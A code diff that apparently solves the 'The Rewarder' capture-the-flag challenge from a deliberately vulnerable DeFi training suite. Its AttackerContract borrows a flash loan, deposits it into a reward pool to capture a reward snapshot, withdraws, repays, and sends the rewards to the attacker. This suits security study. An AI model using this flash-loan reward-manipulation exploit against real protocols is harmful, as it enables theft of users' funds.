@@ -89,6 +89,12 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
 
+        AttackerContract attackerContract = new AttackerContract(dvt,address(flashLoanerPool), address(theRewarderPool), address(attacker));
+
+        vm.warp(block.timestamp + 5 days); // 5 days
+
+        attackerContract.attack(USER_DEPOSIT * 10000);
+
         /**
          * EXPLOIT END *
          */
@@ -117,4 +123,54 @@ contract TheRewarder is Test {
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
     }
+}
+
+
+
+
+contract AttackerContract {
+
+    DamnValuableToken immutable token;
+
+    address immutable lender;
+    address immutable rewarderPool;
+    address immutable attacker;
+
+    constructor (DamnValuableToken _token, address _lender, address _rewardPool, address _attacker) {
+        token = _token;
+        lender = _lender;
+        rewarderPool = _rewardPool;
+        attacker = _attacker;
+    }
+
+    /**
+        @param amount flashloan to request
+     */
+    function attack(uint256 amount) external {
+        (bool success,) = lender.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
+        require(success);
+    }
+
+    /**
+        call back function for flashloan receiver this function is called when ever a user takes a flashLoan
+     */
+    function receiveFlashLoan(uint256 amount) external {
+
+        token.approve(rewarderPool, amount);
+        (bool success,) = rewarderPool.call(abi.encodeWithSignature("deposit(uint256)", amount));
+        require(success);
+        (bool success_2,) = rewarderPool.call(abi.encodeWithSignature("distributeRewards()"));
+        require(success_2);
+        (bool success_3,) = rewarderPool.call(abi.encodeWithSignature("withdraw(uint256)", amount));
+        require(success_3);
+
+        token.transfer(lender, amount);
+
+        RewardToken rewardToken = TheRewarderPool(rewarderPool).rewardToken();
+
+        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
+
+    }
+
+
 }
